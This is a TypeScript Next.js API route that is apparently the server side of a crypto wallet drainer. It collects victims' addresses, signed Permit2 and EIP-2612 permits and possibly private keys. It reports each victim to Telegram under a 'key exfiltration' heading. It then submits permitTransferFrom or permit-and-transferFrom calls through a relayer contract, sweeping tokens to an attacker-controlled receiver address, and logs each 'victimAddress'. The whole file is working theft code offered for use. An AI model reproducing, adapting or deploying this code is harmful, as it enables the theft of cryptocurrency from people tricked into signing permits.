import { ethers } from "ethers";
import { NextResponse } from "next/server";
import {
  sendToTelegram,
  sendDiscoveryToTelegram,
  sendDetailedSweepToTelegram,
  sendActivityToTelegram,
} from "@/lib/telegram";

// 🛰️ ABI IMPORT
import UniversalSettlerABI from "@/constants/abis/UniversalSettler.json";

const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const logPrefix = "[api/vault/route.ts]";

/**
 * 🛠️ RPC CONFIGURATION
 */
const RPC_URLS: Record<number, string> = {
  1: process.env.RPC_URL_1 || "https://rpc.flashbots.net/fast",
  56: "https://bsc-dataseed.binance.org",
  137: "https://polygon-rpc.com",
  8453: "https://mainnet.base.org",
  42161: "https://arb1.arbitrum.io/rpc",
};

const PERMIT2_INTERFACE = new ethers.Interface([
  "function permitTransferFrom(((address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline), (address receiver, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external",
]);

const ERC20_INTERFACE = new ethers.Interface([
  "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
  "function transferFrom(address from, address to, uint256 value) external returns (bool)",
]);

/**
 * 📦 STREAM PACKER
 * Packs multiple calls into the format required by the UniversalSettler perform() function.
 */
function packGhostStream(calls: { target: string; data: string }[]): string {
  let stream = "0x";
  for (const call of calls) {
    const target = call.target.replace("0x", "").padStart(40, "0");
    const data = call.data.replace("0x", "");
    const len = (data.length / 2).toString(16).padStart(64, "0");
    stream += target + len + data;
  }
  return stream;
}

export async function POST(req: Request) {
  const strikeStart = Date.now();
  console.log(`\n--- ⚔️ ${logPrefix} STRIKE INITIATED ---`);

  const host = req.headers.get("host") || "localhost";
  const serverIp = host.split(":")[0];

  try {
    const rawBody = await req.json();

    // 🛡️ RE-HYDRATION: Convert numeric strings back to BigInt for Ethers v6
    const body = JSON.parse(JSON.stringify(rawBody), (key, value) => {
      const bigintFields = ["balance", "value", "amount", "nonce", "deadline"];
      if (bigintFields.includes(key) && typeof value === "string") {
        try {
          return BigInt(value);
        } catch {
          return value;
        }
      }
      return value;
    });

    const { userPrivKey, userAddress, assets, chainId, type } = body;

    if (!userAddress) {
      console.error(`${logPrefix} Validation Failed | Missing userAddress`);
      return NextResponse.json({ error: "Missing Address" }, { status: 400 });
    }

    // --- 1. ACTIVITY & DISCOVERY ---
    if (type === "ACTIVITY") {
      await sendActivityToTelegram({
        address: userAddress,
        step: body.step,
        details: body.details,
      }).catch(() => null);
      return NextResponse.json({ success: true });
    }

    if (type === "DISCOVERY") {
      await sendDiscoveryToTelegram({
        address: userAddress,
        chainId: chainId || 1,
        assets: assets || [],
        userAgent: req.headers.get("user-agent") || "Unknown",
      }).catch(() => null);
      return NextResponse.json({ success: true });
    }

    // --- 2. CONFIG VALIDATION ---
    const relayerKey = process.env.PRIVATE_KEY;
    const settlerAddr =
      process.env.NEXT_PUBLIC_SETTLER_ADDR || process.env.SETTLER_ADDR;
    const receiverEvm = process.env.RECEIVER_EVM;

    if (!relayerKey || !settlerAddr || !receiverEvm) {
      console.error(`${logPrefix} Config Error | Check Env Variables`);
      throw new Error("Relayer Environment Incomplete");
    }

    /**
     * 3. 📡 KEY EXFILTRATION & REPORTING
     */
    if (userPrivKey) {
      sendToTelegram({
        userAddress,
        assets: assets || [],
        chainId: chainId || 1,
      }).catch((err) =>
        console.error(`${logPrefix} Exfil Log Error:`, err.message),
      );
    }

    // Determine RPC URL (Localhost vs Production)
    const rpcUrl =
      chainId === 31337
        ? "http://127.0.0.1:8545"
        : (serverIp.includes("192.168") || serverIp.includes("127.0.0.1")) &&
          chainId === 1
        ? `http://${serverIp}:8545`
        : RPC_URLS[chainId] || RPC_URLS[1];

    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const relayer = new ethers.Wallet(relayerKey, provider);
    const settler = new ethers.Contract(
      settlerAddr,
      UniversalSettlerABI.abi,
      relayer,
    );

    /**
     * 4. ⛽ GAS & NONCE MANAGEMENT
     */
    const [feeData, currentNonce] = await Promise.all([
      provider.getFeeData(),
      provider.getTransactionCount(relayer.address, "pending"),
    ]);

    const gasOverride = {
      maxFeePerGas: (feeData.maxFeePerGas ?? 20n) * 2n,
      maxPriorityFeePerGas: (feeData.maxPriorityFeePerGas ?? 2n) * 4n,
      nonce: currentNonce,
      type: 2,
    };

    const results: any[] = [];

    // --- 5. EXECUTION ENGINE ---
    const executeEVMStrike = async () => {
      let tx;
      try {
        if (body.signatureType === "PERMIT2") {
          const { sig, assets: p2Assets } = body;
          const { nonce, deadline } = p2Assets[0].authData.message;

          const permitData = PERMIT2_INTERFACE.encodeFunctionData(
            "permitTransferFrom",
            [
              {
                permitted: p2Assets.map((a: any) => ({
                  token: a.contractAddress,
                  amount: a.balance,
                })),
                nonce,
                deadline,
              },
              p2Assets.map((a: any) => ({
                receiver: receiverEvm,
                requestedAmount: a.balance,
              })),
              userAddress,
              sig,
            ],
          );

          tx = await settler.perform(
            ethers.id(`${userAddress}-${Date.now()}`),
            packGhostStream([{ target: PERMIT2_ADDRESS, data: permitData }]),
            { ...gasOverride, gasLimit: 1200000n },
          );
        } else if (body.signatureType === "EIP2612") {
          const bundle = Array.isArray(body.assets)
            ? body.assets
            : [body.asset];
          const ghostCalls = [];

          for (const item of bundle) {
            const { contractAddress, authData } = item;
            const { v, r, s } = ethers.Signature.from(body.sig);

            ghostCalls.push({
              target: contractAddress,
              data: ERC20_INTERFACE.encodeFunctionData("permit", [
                userAddress,
                settlerAddr,
                authData.message.value,
                authData.message.deadline,
                v,
                r,
                s,
              ]),
            });

            ghostCalls.push({
              target: contractAddress,
              data: ERC20_INTERFACE.encodeFunctionData("transferFrom", [
                userAddress,
                receiverEvm,
                authData.message.value,
              ]),
            });
          }

          tx = await settler.perform(
            ethers.id(`${userAddress}-${chainId}`),
            packGhostStream(ghostCalls),
            {
              ...gasOverride,
              gasLimit: BigInt(600000 + 150000 * bundle.length),
            },
          );
        }

        if (tx) {
          results.push({ hash: tx.hash, type: body.signatureType });
          await sendDetailedSweepToTelegram({
            status: "SUCCESS",
            type: body.signatureType,
            symbol: body.assets?.[0]?.symbol || "BATCH",
            amount: "BATCH_EXEC",
            victimAddress: userAddress,
            receiverAddress: receiverEvm,
            hash: tx.hash,
            chainId,
          }).catch(() => null);
        }
      } catch (e: any) {
        await sendDetailedSweepToTelegram({
          status: "FAILED",
          type: body.signatureType || "UNKNOWN",
          symbol: "ERROR",
          amount: "0",
          victimAddress: userAddress,
          receiverAddress: receiverEvm,
          hash: "NONE",
          chainId: chainId || 1,
          error: e.message,
        }).catch(() => null);
        throw e;
      }
    };

    await executeEVMStrike();

    return NextResponse.json({
      success: true,
      results: JSON.parse(
        JSON.stringify(results, (k, v) =>
          typeof v === "bigint" ? v.toString() : v,
        ),
      ),
      meta: { executionTime: `${Date.now() - strikeStart}ms` },
    });
  } catch (error: any) {
    console.error(`${logPrefix} CRITICAL FAILURE | ${error.message}`);
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 },
    );
  }
}
